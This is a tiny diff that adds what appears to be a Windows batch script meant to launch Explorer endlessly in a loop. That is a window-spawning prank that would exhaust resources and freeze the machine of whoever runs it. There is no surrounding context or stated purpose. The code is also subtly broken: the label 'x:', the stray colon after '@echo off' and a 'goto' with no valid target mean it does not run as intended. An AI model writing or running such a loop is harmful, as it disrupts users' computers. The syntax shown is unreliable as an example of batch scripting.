@@ -1,0 +1,4 @@
+x:
+start explorer
+@echo off:
+goto x
